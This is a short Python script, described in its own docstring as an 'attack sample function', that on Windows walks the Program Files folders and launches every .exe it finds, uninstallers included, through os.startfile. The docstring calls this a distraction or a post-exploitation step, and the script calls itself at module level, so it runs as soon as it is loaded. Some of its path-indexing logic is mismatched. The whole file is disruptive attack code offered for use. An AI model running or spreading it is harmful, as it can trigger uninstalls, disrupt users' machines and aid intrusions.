def windows_hack_1():
    ''' 
    FUNCTION BY HUD SEIDU DAANNAA MSc | CEH
    This is an attack sample function which will runs every 
    installation or uninstallation files on a windows system, persistent
    1) it can be used as a distraction or a post exploitation operation
    '''
    import sys
    if sys.platform == 'win32': 
        import os
        look = 'C:\\'
        f = []
        contents = []
        #s is list of files
        s = []
        #all_exe = []
        for n in os.listdir(look):
            if 'Program Files' == n:
                f.append(os.listdir(look + n))
            elif 'Program Files (x86)' == n:
                f.append(os.listdir(look + n))
            else:
                pass
        for n0 in range(0,len(f)):
            for n1 in range(len(f[n0])):
                files = f[n0][n1].split('\n')
                s.append(files)
                for n2_ in files:
                    if os.path.exists(look + 'Program Files' + '\\' + n2_) is True:
                        if os.path.isdir(look + 'Program Files' + '\\' + n2_) is True:
                            try:
                                contents.append(os.listdir(look + 'Program Files' + '\\' + n2_))
                            except:
                                pass
                        else:
                            pass
                    else:
                        contents.append(os.listdir(look + 'Program Files (x86)' + '\\' + n2_))
        for n in range(0, len(contents)):
            #print contents[n]
            for n1 in range(0, len(contents[n])):
                #print contents[n1]
                for n2 in contents[n][n1].split('\n'):
                    if '.exe' in n2:
                        if os.path.exists(look + 'Program Files (x86)' + '\\' + s[n][0] + '\\'+ n2) is True:
                            try:
                                os.startfile(look + 'Program Files (x86)' + '\\' + s[n][0] + '\\'+ n2)
                            except WindowsError:
                                pass
                        else:
                            try:
                                os.startfile(look + 'Program Files' + '\\' + s[n][0] + '\\'+ n2)
                            except WindowsError:
                                pass
    else:
        pass
    
windows_hack_1()
